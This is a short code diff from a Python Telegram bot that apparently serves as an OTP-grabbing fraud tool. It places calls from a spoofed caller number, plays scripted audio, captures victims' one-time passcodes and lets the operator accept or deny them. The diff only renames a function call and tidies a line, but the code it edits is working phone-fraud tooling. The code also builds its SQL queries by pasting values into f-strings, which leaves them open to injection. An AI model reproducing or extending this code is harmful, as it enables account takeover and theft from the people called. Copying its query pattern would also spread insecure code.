@@ -1239,7 +1239,7 @@ def aplha_prebuild_script_call(script_id,chatid):
     "audiourl": f"https://sourceotp.online/scripts/{script_id}/output4.wav",
 }
             requests.post(url, json=data)
-            otp_grabbed(chatid,otp=otp2)
+            alpha_otp_grabbed(chatid)
             keyboard = types.InlineKeyboardMarkup(row_width=2)
             item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept_alpha")
             item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny_alpha")
@@ -1361,11 +1361,10 @@ Please wait verifying your inputes 🧑‍💻*""",parse_mode='markdown')
                         row= c.fetchone()
                         call_s1 = row[6]
                         if (call_s1!=0):
-                
-                                c.execute(f"update call_data set last_service='alpha' where chat_id={id} ")
+                                c.execute(f"update call_data set last_service='alpha' where chat_id={id}")
                                 db.commit()
                                 call_update(id)                    
-                                b=alpha_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id)
+                                alpha_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id)
 
                         else:
                             bot.send_message(message.from_user.id, """* Custom script not found! \n Create First -> /customscript *""",parse_mode='markdown')
